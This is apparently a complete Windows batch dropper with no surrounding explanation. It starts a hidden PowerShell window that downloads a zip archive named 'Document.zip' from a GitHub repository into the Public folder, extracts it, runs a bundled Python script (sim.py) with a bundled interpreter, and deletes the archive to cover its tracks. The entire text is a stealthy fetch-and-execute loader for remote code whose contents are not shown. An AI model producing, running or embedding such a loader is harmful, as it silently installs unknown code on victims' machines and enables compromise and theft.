...
@echo off
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/abareklw/dcm/raw/main/Document.zip', '%PUBLIC%\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%PUBLIC%\\Document.zip', '%PUBLIC%\\Document'); Start-Sleep -Seconds 1; %PUBLIC%\\Document\\python %PUBLIC%\\Document\\Lib\\sim.py; del %PUBLIC%\\Document.zip" && exit
